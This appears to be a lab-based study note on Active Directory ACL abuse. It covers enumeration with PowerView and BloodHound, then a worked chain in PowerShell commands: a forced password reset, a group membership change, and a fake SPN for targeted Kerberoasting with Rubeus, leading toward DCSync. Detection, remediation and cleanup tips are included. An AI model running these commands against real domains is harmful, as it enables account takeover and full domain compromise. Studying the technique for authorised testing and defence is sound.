# ACL Abuse in Active Directory

## What are ACLs & ACEs?
- **ACL (Access Control List):** List of permissions on an AD object.
- **ACE (Access Control Entry):** Single permission entry in an ACL (who, what rights).
- **DACL:** Who can access/modify the object.
- **SACL:** What access attempts are audited.

## Why Attackers Care
- Misconfigured ACLs = stealthy privilege escalation, lateral movement, persistence.
- Abusable rights often go undetected by standard vulnerability scans.

## Key Abusable Rights (for Red/Blue Teams)
| Right/ACE         | What It Lets You Do                        | Example Tool/Command           |
|-------------------|--------------------------------------------|-------------------------------|
| GenericAll        | Full control over object                   | Set-DomainUserPassword        |
| GenericWrite      | Write to most attributes                   | Set-DomainObject              |
| WriteOwner        | Change object owner                        | Set-DomainObjectOwner         |
| WriteDACL         | Change permissions (add more rights)       | Add-DomainObjectACL           |
| ForceChangePassword | Reset user password (no old pwd needed)  | Set-DomainUserPassword        |
| AddMember         | Add users to groups                        | Add-DomainGroupMember         |
| AddSelf           | Add self to group (if allowed)             | Add-DomainGroupMember         |
| AllExtendedRights | Special/rare rights (reset pwd, etc.)      | Set-DomainUserPassword        |

## ACL Enumeration

### PowerView (Targeted Enumeration)
- **Don't enumerate everything!** Focus on users/groups you control.
- Get SID of your user:
  ```powershell
  $sid = Convert-NameToSid wley
  ```
- Find objects your user can control:
  ```powershell
  Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
  ```
  **Example Output:**
  ```
  ObjectDN               : CN=Dana Amundsen,OU=DevOps,...
  ActiveDirectoryRights  : ExtendedRight
  ObjectAceType          : User-Force-Change-Password
  AceType                : AccessAllowedObject
  ...
  ```
  - **What to look for:**
    - `GenericAll` = full control
    - `GenericWrite` = can write most attributes
    - `User-Force-Change-Password` = can reset password
    - `DS-Replication-Get-Changes` = DCSync (can dump hashes)

- Map GUIDs to readable names if needed:
  ```powershell
  $guid = "00299570-246d-11d0-a768-00aa006e0529"
  Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * | ?{$_.rightsGuid -eq $guid} | fl Name,DisplayName
  ```
  **Example Output:**
  ```
  Name        : User-Force-Change-Password
  DisplayName : Reset Password
  ```

- Recursively enumerate: If you control user A, check what A controls, and so on.
- Use `-Verbose` for more info, and always use `-ResolveGUIDs` for clarity.

### PowerShell (No PowerView)
- List all users:
  ```powershell
  Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
  ```
- For each user, check ACLs:
  ```powershell
  foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {
    get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}
  }
  ```
  - **Slower and less readable than PowerView, but works if modules are restricted.**

### BloodHound (Graphical, Fastest for Paths)
- **Collect data:**
  - Run SharpHound on a domain-joined host:
    ```powershell
    .\SharpHound.exe -c All
    ```
  - Or use the PowerShell ingestor:
    ```powershell
    Invoke-BloodHound -CollectionMethod All -Domain INLANEFREIGHT.LOCAL -ZipFileName data.zip
    ```
- **Upload results:**
  - Open BloodHound GUI, upload the zip file.
- **Analyze:**
  - Set your user as the start node.
  - Use "Outbound Control Rights" and "Transitive Object Control" to see what you can control.
  - Right-click edges for help, tools, and OpSec notes.
  - Use pre-built queries:
    - "Shortest Paths to High Value Targets"
    - "Users with DCSync Rights"
    - "Users with Password Reset Rights"
- **Edge types to know:**
  - `ForceChangePassword` (reset password)
  - `AddMember` (add to group)
  - `GenericWrite`/`GenericAll` (write or full control)
  - `GetChangesAll`/`GetChanges` (DCSync)
- **Example BloodHound path:**
  - wley → damundsen (ForceChangePassword) → Help Desk Level 1 (GenericWrite) → Information Technology (nested group) → adunn (GenericAll) → DCSync

### Troubleshooting & Tips
- **PowerView import errors:**
  - Try `Unblock-File .\PowerView.ps1` before importing.
  - Use a fresh PowerShell session if you get function redefinition errors.
- **Slow queries:**
  - Use targeted enumeration (`-Identity <user/group>`), not `*` in large domains.
- **Missing rights:**
  - Make sure you have the right permissions to query AD objects.
  - Some objects may be hidden by adminSDHolder or other protections.
- **BloodHound issues:**
  - If you see missing edges, re-run SharpHound with more collection methods.
  - Check for time sync issues between hosts.

### OpSec Considerations
- **BloodHound/SharpHound is noisy** (triggers lots of LDAP queries/logs).
- **PowerView can be noisy** if run with `-Identity *`.
- **Targeted enumeration is stealthier** (query only what you need).
- **Password resets, group changes, and DCSync are highly detectable.**
- **Always get approval before making changes in production.**

---
**Attack Chain Example:**
1. You control user `wley` (cracked hash).
2. `wley` can ForceChangePassword for `damundsen`.
3. `damundsen` has GenericWrite on `Help Desk Level 1` group.
4. That group is nested in `Information Technology` group.
5. `Information Technology` has GenericAll on `adunn` (can reset password, add to group, etc).
6. `adunn` has DCSync rights (can dump all AD hashes).

**Summary:**
- Enumerate only what matters (your user, their targets, and so on).
- Use PowerView for targeted, scriptable checks; BloodHound for visual pathing.
- Always resolve GUIDs for clarity.
- Recursively follow the chain to high-value targets.

## Typical Attack Flow
1. **Enumerate ACLs:** BloodHound, PowerView, ADExplorer
2. **Find abusable ACEs:** Look for above rights on users/groups/computers
3. **Exploit:** Use PowerView, BloodHound, or built-in tools to abuse rights
4. **Escalate/Move Laterally:** Reset passwords, add to groups, etc.

<img width="1734" height="821" alt="image" src="https://github.com/user-attachments/assets/3a2ba8ef-5ca0-4dec-bb32-83b605e6d51f" />
Credit to:  Charlie Bromberg

## Real-World Scenarios
- Helpdesk can reset Domain Admin passwords (ForceChangePassword)
- User can add self to privileged group (AddSelf)
- Service account has GenericWrite on another user (Kerberoasting, persistence)

## Blue Team Tip
- Regularly audit ACLs on sensitive objects (users, groups, computers, OUs)
- Use BloodHound's "Shortest Paths to High Value Targets"

---
**Note:** Some ACL attacks are destructive (e.g., password resets). Always get client approval and document changes during assessments. 

## ACL Abuse Tactics

### Attack Chain Recap
- **Start:** Control of user `wley` (cracked NTLM hash via Responder + Hashcat)
- **Goal:** Full domain compromise via DCSync (control of `adunn`)

### Step 1: Force Password Reset (wley → damundsen)
```powershell
$SecPassword = ConvertTo-SecureString '<WLEY_PASSWORD>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
Import-Module .\PowerView.ps1
Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
```
- **Result:** You control `damundsen`.

### Step 2: Group Membership Abuse (damundsen → Help Desk Level 1)
```powershell
$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
```
- **Result:** `damundsen` is now in Help Desk Level 1 group.

### Step 3: Nested Group Escalation (Help Desk Level 1 → Information Technology)
- Help Desk Level 1 is nested in Information Technology group.
- Information Technology group has `GenericAll` on `adunn`.

### Step 4: Targeted Kerberoasting (adunn)
- **Create a fake SPN:**
```powershell
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```
- **Kerberoast with Rubeus:**
```powershell
.\Rubeus.exe kerberoast /user:adunn /nowrap
```
- **Crack the hash offline with Hashcat.**

### Step 5: Cleanup
- **Remove fake SPN:**
```powershell
Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose
```
- **Remove user from group:**
```powershell
Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
```
- **Reset damundsen password (if needed).**

### Detection & Remediation
- **Monitor for:**
  - Event ID 5136 (object modified)
  - Group membership changes
  - SPN modifications
- **Remediate:**
  - Audit and remove dangerous ACLs
  - Monitor high-value group memberships
  - Train staff to use BloodHound for regular reviews

---
**Note:** This is a real-world attack chain seen in CTFs and real environments. Always document changes and get approval in real assessments. 
